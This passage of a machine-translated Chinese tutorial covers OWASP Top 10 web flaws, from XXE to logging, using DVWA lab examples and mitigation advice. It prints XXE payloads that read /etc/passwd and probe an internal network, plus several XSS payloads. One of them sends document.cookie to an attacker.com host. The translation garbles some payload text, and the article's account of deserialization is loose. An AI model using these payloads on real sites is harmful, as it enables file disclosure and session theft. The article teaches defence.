translated">任何静态敏感数据都应至少使用AES256位加密进行加密。对于任何传输中的数据，您应该考虑使用至少TLS 1.2对流量进行加密。</p><p id="2861" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">不用说，任何敏感数据都不应该存储在代码库中。</p><p id="6607" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 4 — XML外部实体(XXE) </strong></p><p id="65ba" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这种攻击实际上涵盖了一个更广泛、更常见的问题。许多支持上传文件的网站将文件保存在HTTP目录结构中，这意味着一旦上传，就可以通过浏览器执行。一些网站可能会检测到上传的问题，但不会删除它，因此它仍然可以被攻击者执行。</p><p id="0bb8" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我将给你一个使用DVWA的实际例子。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nc"><img src="../Images/acd3b4923bed29485e301726b38e3f8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r2QOEnwx9PkecImGa6valA.png"/></div></div></figure><p id="a639" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">所以DVWA希望上传一张图片，但是如果我们上传以下图片呢？</p><p id="9719" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">【phpinfo.php<br/><strong class="la iu"/>(显示php的完整配置，但这是一个在上传后如何运行任何PHP脚本的例子)</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="8fb5" class="mq mr it mm b gy ms mt l mu mv">&lt;?php phpinfo() ?&gt;</span></pre><p id="1db4" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> attack1.xml </strong> <br/>(攻击者试图检索passwd文件！)</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="13b0" class="mq mr it mm b gy ms mt l mu mv">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>&lt;!DOCTYPE foo [<br/>&lt;!ELEMENT foo ANY &gt;<br/>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;<br/>&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></pre><p id="c83d" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> attack2.xml </strong> <br/>(攻击者正在探查内部网络)</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="9750" class="mq mr it mm b gy ms mt l mu mv">&lt;!ENTITY xxe SYSTEM "https://192.168.1.1/private" &gt;]&gt;</span></pre><p id="498c" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> attack3.xml </strong> <br/>(潜在的拒绝服务攻击打开一个无休止的文件)</p><pre class="kj kk kl km gt ml mm mn mo aw mp bi"><span id="319e" class="mq mr it mm b gy ms mt l mu mv">&lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;</span></pre><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nd"><img src="../Images/0e9b7a52af1d13304fc9883de3d959df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0mWAATjtCHyNU262Vpvd7A.png"/></div></div></figure><p id="2545" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">所以我上传了“<strong class="la iu">phpinfo.php</strong>”，你可以看到上传的文件在HTTP目录结构中是可达的。</p><p id="56ee" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><a class="ae lu" href="http://3.249.140.112/DVWA/hackable/uploads/phpinfo.php" rel="noopener ugc nofollow" target="_blank">http://SERVER _ IP/DVWA/hackable/uploads/phpinfo . PHP</a></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ne"><img src="../Images/2f4dedf2879c6111be5a72d4f399a33a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RGblS5UZmOomxf48KN9lFQ.png"/></div></div></figure><p id="917a" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">上传的文件<strong class="la iu">永远不能直接通过浏览器</strong>访问。如果你认为你可以用MIME检查或任何其他检查来验证上传的文件，那你就错了，因为它们可能会被欺骗。如果上传的文件可以通过浏览器访问(同名)，无论你认为它有多安全，你都是易受攻击的。</p><p id="bc5b" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">如果你对此感到困惑，这里有一些建议:</p><ul class=""><li id="f5d1" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">如果上传有可疑问题隔离或删除它，不要把它留在系统的“<em class="mk">上传</em>目录中。</li><li id="3d56" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">将上传的文件重命名为其他名称，使攻击者更难找到并执行该文件。</li><li id="348c" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">如果您需要通过浏览器检索上传的文件，请使用助手函数来检索文件并提供服务。这将给你更多的控制来运行额外的检查。</li><li id="f3b0" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">确保您的web服务器禁用了目录浏览。您应该不能浏览任何目录并看到全部内容。</li><li id="7d2c" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">确保您的web服务器上没有目录递归。你不希望他们做这样的事情../../../etc/passwd。</li></ul><p id="efdb" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 5 —访问控制被破坏</strong></p><p id="7d04" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这很难证明，但漏洞的可能症状有:</p><ul class=""><li id="2689" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">攻击者能够强制浏览到他们不应该拥有权限页面或目录。</li><li id="8069" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">攻击者能够将他们自己的自定义数据发布到不能正确验证数据的表单和API。</li></ul><p id="7e40" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">通常识别这些漏洞的方法是使用<a class="ae lu" href="https://owasp.org/www-community/Source_Code_Analysis_Tools" rel="noopener ugc nofollow" target="_blank">静态应用程序安全测试(SAST) </a>工具进行源代码分析，使用<a class="ae lu" href="https://owasp.org/www-community/Vulnerability_Scanning_Tools" rel="noopener ugc nofollow" target="_blank">动态应用程序安全测试(DAST) </a>工具进行漏洞扫描。根据您的需求，您需要为正在使用的编程语言使用合适的工具。</p><p id="c70c" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 6 —安全错误配置</strong></p><ul class=""><li id="f518" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">许多服务和库是使用默认登录凭据安装的。以DVWA为例，它的用户名和密码是“admin”和“password”。如果您只是保留默认值，攻击者就很容易进入。始终更改默认用户名和密码。用户名和密码一样重要。尽量不要使用明显的管理员和超级用户用户名，例如admin、root、administrator等。</li><li id="0634" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">许多服务都提供了默认代码或示例代码。这些应该被删除，不能通过您的网站。</li><li id="e1d5" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">不要把不用的网页留在你的网页目录里。如果您正在使用它们，请将其移除。仅仅因为用户可能无法通过web应用程序中的链接浏览到它，并不意味着攻击者不能直接强制浏览到它。</li><li id="9603" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">确保正确设置了文件和目录的权限，并且禁用了目录浏览。您的web服务器应该由专门的用户和组运行，例如“wwwrun”和“www”。web服务器用户应该只能访问网站并进行登录。如果攻击者能够控制web服务器服务，他们应该只能做非常有限的事情。以“root”或“管理员”身份运行web服务器显然是不可接受的。</li><li id="43c8" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">web服务器和编程语言应该被配置成在它们是什么和版本方面透露很少的信息。详细错误消息和调试应该仅在开发时可用，并且应该在生产中关闭或通用。</li></ul><p id="99e9" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 7 —跨站点脚本(XSS) </strong></p><p id="9304" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">实际上有三种形式的XSS攻击，它们是最容易检测到的漏洞之一。有许多工具，我将在接下来的文章中介绍，它们将非常快速和容易地检测到这些问题。</p><ul class=""><li id="62e7" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated"><strong class="la iu">映XSS </strong></li></ul><p id="68f8" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">攻击者能够在表单和API帖子中包含HTML和Javascript，从而允许代码在受害者浏览器中自动执行。</p><p id="e02a" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">让我们看一个使用DVWA的例子…</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nd"><img src="../Images/4a6c79ac26b5dea8be5ec2c90d24da07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yAQi2f-dVA-plQFauBfQUg.png"/></div></div></figure><p id="4a7b" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">一张简单的询问我名字的表格。</p><p id="e45c" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">如果我将Javascript代码作为名称，会发生什么？<br/> <strong class="la iu"> ' &gt; &lt;剧本&gt;警戒(" XSS进攻！")&lt;/脚本&gt;’</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nf"><img src="../Images/f5bb9608a80a3200852bba17cc21b542.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xDhaGIGCLy0l38uLmUC1-A.png"/></div></div></figure><ul class=""><li id="250b" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated"><strong class="la iu">存储的XSS </strong></li></ul><p id="79b2" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">攻击者能够在表单和API帖子中包含和存储HTML和Javascript，这使得代码可以在以后被其他用户或管理员查看。这种攻击实际上比反射XSS更糟糕，因为无意中运行代码的用户或管理员可能拥有提升的权限。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nd"><img src="../Images/aa32797a3fbfd3df794b05e4d50a5f1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xeIptF_xXbhns4VIGtBv9Q.png"/></div></div></figure><p id="f081" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">在留言簿上签名的简单表格。</p><p id="2384" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">如果我在消息中包含Javascript代码，会发生什么？<br/> <strong class="la iu"> ' &gt; &lt;剧本&gt;警戒(" XSS进攻！")&lt;/剧本&gt;’</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nf"><img src="../Images/f5bb9608a80a3200852bba17cc21b542.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xDhaGIGCLy0l38uLmUC1-A.png"/></div></div></figure><p id="f101" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">更糟糕的是，每次页面加载警告模式“XSS攻击”时，这个信息都会存储在数据库中突然出现。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nc"><img src="../Images/f51b68118d7c8e87863e7bf57a649fc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f1bKgRgQjrYce6SEXIgkMw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ng"><img src="../Images/b7f46ceb74d4873e0e5a3db9dc78255a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lbeEaFRWq8DQdEVnsQcDJw.png"/></div></div></figure><p id="a2ea" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">请记住，这只是一个基本的Javascript警报，但如果攻击者将用户重定向到其他包含敏感信息(如您的浏览器cookie信息)的地方，该怎么办呢！</p><p id="149a" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> ' &gt; &lt;脚本&gt;document . location = '</strong><a class="ae lu" href="http://www.attacker.com/cgi-bin/cookie.cgi" rel="noopener ugc nofollow" target="_blank"><strong class="la iu">http://www.attacker.com/cgi-bin/cookie.cgi</strong></a><strong class="la iu">？foo = '+document . cookie&lt;/script&gt;'。</strong></p><ul class=""><li id="ceae" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">多姆XSS<strong class="la iu"/></li></ul><p id="f991" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这通常与基于Javascript的应用程序有关。攻击者能够将攻击者可控制的数据包含到易受DOM XSS攻击的页面中。典型攻击的示例可能是窃取会话、接管帐户、绕过MFA、DOM节点操作、恶意组件、按键记录和许多其他客户端攻击。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nc"><img src="../Images/ecdf77fe5a85ba6dae6ccb7c3df23974.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_BDCHzme9pWDeoVLixW_Cw.png"/></div></div></figure><p id="d3b3" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">看起来足够无害…我选择“<strong class="la iu">英文</strong>”。</p><p id="50ec" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">你会注意到网址改成了这样:<br/><a class="ae lu" href="http://3.249.140.112/DVWA/vulnerabilities/xss_d/?default=English" rel="noopener ugc nofollow" target="_blank"><strong class="la iu">http://SERVER _ IP/DVWA/vulnerabilities/XSS _ d/？</strong>默认=英文</a></p><p id="61db" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">但是如果我把"<strong class="la iu">英文</strong>"换成"<strong class="la iu"> &lt;脚本&gt; alert('XSS进攻！')会怎么样呢)&lt;/剧本&gt; </strong>”</p><p id="6b24" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><a class="ae lu" href="http://3.249.140.112/DVWA/vulnerabilities/xss_d/?default=English" rel="noopener ugc nofollow" target="_blank"><strong class="la iu">http://SERVER _ IP/DVWA/vulnerability/XSS _ d/？默认= </strong> </a> <strong class="la iu"> &lt;脚本&gt;警报(‘XSS攻击’)&lt;/脚本&gt; </strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nf"><img src="../Images/f5bb9608a80a3200852bba17cc21b542.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xDhaGIGCLy0l38uLmUC1-A.png"/></div></div></figure><p id="fe04" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><a class="ae lu" href="http://3.249.140.112/DVWA/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27XSS%20attack%27)%3C/script%3E" rel="noopener ugc nofollow" target="_blank"><strong class="la iu">http://SERVER _ IP/DVWA/vulnerability/XSS _ d/？default = % 3Cscript %警报(% 27XSS %攻击%27)%3C/script%3E </strong> </a></p><p id="7a4f" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 8 —不安全的去串行化</strong></p><p id="9010" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">描述这种情况最简单的方法是重放攻击。攻击者将捕获两台设备之间的未加密通信，对通信进行更改，然后重放它。</p><p id="98cb" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">例如，一个PHP应用程序使用PHP对象序列化来保存一个“超级”cookie，其中包含用户的用户ID、角色、密码散列和其他状态。攻击者会更改这个cookie来为他们提供提升的权限。</p><p id="2e33" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 9 —使用具有已知漏洞的组件</strong></p><p id="ccfe" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">攻击者经常试图利用未修补的漏洞。这实际上比你想象的要容易，因为有像<a class="ae lu" href="https://www.exploit-db.com/" rel="noopener ugc nofollow" target="_blank"> Exploit DB </a>这样的免费数据库，其中包含成千上万的漏洞以及如何使用它们。这就是为什么隐藏尽可能多的关于服务和版本的信息是必要的。例如，如果攻击者能够发现一个web应用程序在apache 2.4上使用php 7.4，他们只需要在数据库中搜索“PHP 7.4”和“Apache 2.4”，就可以利用许多已知的漏洞。</p><p id="ebb9" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la iu"> 10 —测井不足&amp;监测</strong></p><p id="b54b" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这里的底线是，如果你没有意识到你正在被攻击，你基本上是在给攻击者无限的时间来实施他们的攻击。如果攻击者能够危害您的应用程序，而您却没有意识到，他们可能会造成严重破坏并毁坏可能无法恢复的数据。据OWASP称，大多数违规研究表明，检测违规的时间超过200天，通常是由外部方检测到的，而不是内部流程或监控。</p><p id="e720" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">那么你应该做什么呢？</p><ul class=""><li id="e8f1" class="lv lw it la b lb lc le lf lh lx ll ly lp lz lt mj mb mc md bi translated">审计事件，如登录、失败、高价值交易等。</li><li id="3b7c" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">警告和错误应该生成有意义的日志条目。</li><li id="47fb" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">记录可疑活动(例如过度使用API调用)。</li><li id="0420" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">集中记录…不要在本地存储日志。</li><li id="434a" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">实施一个流程，以近乎实时的方式处理特定阈值的事件。</li><li id="0e21" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated">自动化安全事件处理，例如SOAR(安全协调、自动化和响应)以及安全信息和事件管理(SIEM)</li></ul><p id="23d2" class="pw-post-body-paragraph ky kz it la b lb lc ju ld le lf jx lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">为了进一步阅读，请查看我写的关于这个话题的19个故事。</p><div class="nh ni gp gr nj"><div role="button" tabindex="0" class="ab bv gv cb fp nk nl bn nm ks ex"><div class="nn l"><div class="ab q"><div class="l di"><img alt="Michael Whittle" class="l de bw no np fe" src="../Images/f4d39d0c62b7f2e165491c1e2a8c6e26.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*efn30YXRNnd9uk7qbTOGnA.jpeg"/><div class="fb bw l no np fc n aw fd"/></div><div class="hh l fo"><p class="bd b dl z fp fq fr fs ft fu fv fw dk translated">迈克尔·惠特尔</p></div></div><div class="ns nt gw l"><h2 class="bd iu tz lv fp ua fr fs ub fu fw is bi translated">道德黑客培训课程</h2></div><div class="ab q"><div class="l fo"><a class="bd b be z bi uc au ud ue uf qi ug an eh ei uh ui uj el em eo de bk ep" href="https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----3f2d55580ba8--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="uk l fo"><span class="bd b dl z dk">19 stories</span></div></div></div><div class="of dh og fp ab oh fo di"><div class="di nx bv ny nz"><div class="dh l"><img alt="" class="dh" src="../Images/57c6829d9a7a0ff6d78e5d828845bb8c.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*UJZPySDP-tEonnesSAbLgA.png"/></div></div><div class="di nx bv oa ob oc"><div class="dh l"><img alt="" class="dh" src="../Images/e2d3aa85ee76ceb2b889dd753c231b67.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*rt1tdkIaxU8p69xo_yz9zg.jpeg"/></div></div><div class="di bv od oe oc"><div class="dh l"><img alt="" class="dh" src="../Images/6240cd235d84e9cd8cb158d7147a71f5.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*78Op5N9xBfarPgmmwpHCQQ.jpeg"/></div></div></div></div></div><h1 id="5b44" class="ol mr it bd om on oo op oq or os ot ou jz ov ka ow kc ox kd oy kf oz kg pa pb bi translated">迈克尔·惠特尔</h1><ul class=""><li id="5302" class="lv lw it la b lb pc le pd lh pe ll pf lp pg lt mj mb mc md bi translated"><strong class="la iu"> <em class="mk">如果你喜欢这个，请</em> </strong> <a class="ae lu" href="https://whittle.medium.com/" rel="noopener"> <strong class="la iu"> <em class="mk">跟我上媒</em> </strong> </a></li><li id="737a" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated"><strong class="la iu"> <em class="mk">更多有趣的文章，请</em> </strong> <a class="ae lu" href="https://medium.com/trading-data-analysis" rel="noopener"> <strong class="la iu"> <em class="mk">关注我的刊物</em> </strong> </a></li><li id="5d7b" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated"><strong class="la iu"> <em class="mk">有兴趣合作？</em> </strong> <a class="ae lu" href="https://www.linkedin.com/in/miwhittle/" rel="noopener ugc nofollow" target="_blank"> <strong class="la iu"> <em class="mk">咱们上领英</em> </strong> </a>连线</li><li id="e1a5" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated"><strong class="la iu"> <em class="mk">支持我和其他媒体作者</em> </strong> <a class="ae lu" href="https://whittle.medium.com/membership" rel="noopener"> <strong class="la iu"> <em class="mk">在此报名</em> </strong> </a></li><li id="872e" class="lv lw it la b lb me le mf lh mg ll mh lp mi lt mj mb mc md bi translated"><strong class="la iu"> <em class="mk">请别忘了为文章鼓掌:)←谢谢！</em> </strong></li></ul></div></div>    
</body>
</html>